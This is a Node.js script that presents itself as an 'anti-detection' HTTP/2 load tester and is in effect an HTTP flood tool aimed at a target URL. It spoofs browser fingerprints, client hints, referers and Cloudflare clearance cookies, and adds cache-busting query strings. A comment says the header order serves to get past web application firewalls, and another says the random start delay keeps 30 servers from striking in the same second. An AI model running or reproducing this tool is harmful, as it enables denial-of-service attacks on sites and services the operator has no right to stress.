/**
 * Improved HTTP/2 Load Tester - Anti-Detection Version
 * Features: Header Ordering, Client Hints (SEC-CH-UA), Randomized Startup Delay.
 */

var http2 = require("http2");
var https = require("https");
var tls = require("tls");
var URL = require("url").URL;
var crypto = require("crypto");

// --- DATA KONTEKSTUAL ---
var REFERERS_MAP = {
    google: ["https://www.google.com/", "https://www.google.co.id/", "https://www.google.co.jp/"],
    bing: ["https://www.bing.com/", "https://www.bing.co.uk/"],
    yandex: ["https://yandex.com/", "https://yandex.ru/"],
    brave: ["https://search.brave.com/"],
};
var ALL_REFERERS = [].concat(...Object.values(REFERERS_MAP), "https://duckduckgo.com/");

var LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "id-ID,id;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
];

// --- ARGUMEN CLI ---
var args = process.argv.slice(2);

if (args.length < 3) {
    console.log("Usage: node main.js <url> <time> <rate> [threads] [browser] [os] [referer] [method] [protocol]");
    process.exit(1);
}

var targetUrl = args[0];
var duration = parseFloat(args[1]);
var rate = parseFloat(args[2]);
var threads = args[3] ? parseInt(args[3], 10) : 1;
var browserOpt = (args[4] || "mixed").toLowerCase();
var osOpt = (args[5] || "random").toLowerCase();
var refererOpt = (args[6] || "mixed").toLowerCase();
var methodOpt = (args[7] || "get").toUpperCase();
var protocolOpt = (args[8] || "mixed").toLowerCase();

var parsedUrl;
try {
    parsedUrl = new URL(targetUrl);
} catch (e) {
    console.log("Error: URL tidak valid.");
    process.exit(1);
}

// --- UTILITIES ---
function rand(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randStr(length) {
    return crypto.randomBytes(Math.ceil(length/2)).toString('hex').slice(0, length);
}

function generateFingerprint(osType, browserType) {
    var os = osType === "random" ? rand(["windows", "macos", "linux", "iphone", "android"]) : osType;
    var browser = browserType === "mixed" ? rand(["chrome", "edge", "opera"]) : browserType;
    
    var versions = {
        chrome: { ver: "124", full: "124.0.6367.119" },
        edge: { ver: "124", full: "124.0.2478.80" },
        opera: { ver: "110", full: "110.0.5130.66" }
    };

    var b = versions[browser] || versions.chrome;
    var ua = "";
    var ch_plat = "";

    if (os === "windows") {
        ua = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${b.full} Safari/537.36`;
        ch_plat = '"Windows"';
    } else if (os === "macos") {
        ua = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${b.full} Safari/537.36`;
        ch_plat = '"macOS"';
    } else if (os === "iphone") {
        ua = `Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1`;
        ch_plat = '"iOS"';
    } else {
        ua = `Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${b.full} Mobile Safari/537.36`;
        ch_plat = '"Android"';
    }

    if (browser === "edge") ua += ` Edg/${b.full}`;
    if (browser === "opera") ua += ` OPR/${b.full}`;

    return { ua, ch_plat, browser, os };
}

function buildH2Headers(path, host) {
    var info = generateFingerprint(osOpt, browserOpt);
    
    // URUTAN HEADER INI SANGAT KRUSIAL UNTUK MELEWATI WAF
    var headers = {
        ":method": methodOpt,
        ":path": path,
        ":scheme": "https",
        ":authority": host,
        "sec-ch-ua": info.browser === "chrome" 
            ? `"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`
            : `"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": info.os === "iphone" || info.os === "android" ? "?1" : "?0",
        "sec-ch-ua-platform": info.ch_plat,
        "upgrade-insecure-requests": "1",
        "user-agent": info.ua,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "referer": (refererOpt === "mixed" ? rand(ALL_REFERERS) : rand(REFERERS_MAP[refererOpt] || ALL_REFERERS)),
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": rand(LANGS),
        "priority": "u=0, i",
    };

    // Randomize Cookie & Cache per request
    headers["cookie"] = `session=${randStr(16)}; _ga=${randStr(10)}; cf_clearance=${randStr(40)}`;
    if (Math.random() > 0.5) headers["cache-control"] = "max-age=0";

    return headers;
}

// --- GLOBAL STATE ---
var stopped = false;
var totalSent = 0;
var totalDone = 0;
var totalLatency = 0;
var counts = {};
var errors = {};
var pool = [];

// --- CORE FUNCTIONS ---
function spawnSession(idx) {
    if (stopped) return;
    var slot = pool[idx];
    if (slot.connecting) return;
    slot.connecting = true;

    var tlsVersion = protocolOpt === "tlsv1.3" ? "TLSv1.3" : "TLSv1.2";
    var sess = http2.connect("https://" + parsedUrl.host, {
        rejectUnauthorized: false,
        servername: parsedUrl.hostname,
        minVersion: tlsVersion,
        maxVersion: "TLSv1.3",
        settings: { initialWindowSize: 6291456, maxConcurrentStreams: 1000, enablePush: false }
    });

    sess.once("connect", function () {
        slot.session = sess;
        slot.ready = true;
        slot.connecting = false;
        var q = slot.queue.splice(0);
        for (var i = 0; i < q.length; i++) q[i](sess);
    });

    function onDead() {
        slot.session = null; slot.ready = false; slot.connecting = false;
        if (!stopped) setTimeout(() => spawnSession(idx), 500);
    }
    sess.on("error", onDead);
    sess.on("close", onDead);
}

function doRequest(idx) {
    var slot = pool[idx];
    if (!slot.ready) {
        if (!slot.connecting) spawnSession(idx);
        return;
    }

    var path = parsedUrl.pathname + (parsedUrl.search || "?") + (randStr(5) + "=" + randStr(5));
    var start = Date.now();
    totalSent++;

    try {
        var req = slot.session.request(buildH2Headers(path, parsedUrl.host));
        req.on("response", (hdrs) => {
            var status = hdrs[":status"];
            counts[status] = (counts[status] || 0) + 1;
        });
        req.on("error", (e) => {
            errors[e.code] = (errors[e.code] || 0) + 1;
        });
        req.on("end", () => {
            totalDone++;
            totalLatency += (Date.now() - start);
        });
        req.end();
    } catch (e) {
        slot.ready = false;
    }
}

// --- DASHBOARD UI ---
var C = { reset: "\x1b[0m", bold: "\x1b[1m", cyan: "\x1b[36m", green: "\x1b[32m", red: "\x1b[31m", gray: "\x1b[90m", clear: "\x1b[2J\x1b[H" };

function renderDashboard(elapsed, finished) {
    process.stdout.write(C.clear);
    console.log(C.bold + C.cyan + " [ HTTP/2 ANTI-BLOCK TESTER ] " + C.reset);
    console.log(C.gray + " Target: " + C.reset + targetUrl);
    console.log(C.gray + " Config: " + C.reset + browserOpt + " / " + osOpt + " / " + methodOpt);
    console.log(" --------------------------------------------------");
    console.log(` Sent: ${totalSent} | Done: ${totalDone} | Latency: ${totalDone > 0 ? (totalLatency/totalDone).toFixed(0) : 0}ms`);
    console.log(" --------------------------------------------------");
    
    Object.keys(counts).forEach(code => {
        console.log(` Status ${code}: ${counts[code]}x`);
    });
    
    if (finished) {
        console.log(C.green + "\n [ COMPLETED ]" + C.reset);
        process.exit(0);
    }
}

// --- EXECUTION (RANDOMIZED START) ---
for (var i = 0; i < threads; i++) {
    pool.push({ session: null, ready: false, connecting: false, queue: [] });
}

// Delay startup antara 0-2 detik agar 30 server tidak membombardir di detik yang sama
var startDelay = Math.floor(Math.random() * 2000);

setTimeout(() => {
    var startTime = Date.now();
    var interval = setInterval(() => {
        var elapsed = (Date.now() - startTime) / 1000;
        if (elapsed >= duration) {
            stopped = true;
            clearInterval(interval);
            renderDashboard(elapsed, true);
        } else {
            for (var i = 0; i < threads; i++) doRequest(i);
        }
    }, 1000 / rate);

    setInterval(() => renderDashboard((Date.now() - startTime) / 1000, false), 500);
}, startDelay);

process.on("SIGINT", () => { stopped = true; process.exit(0); });
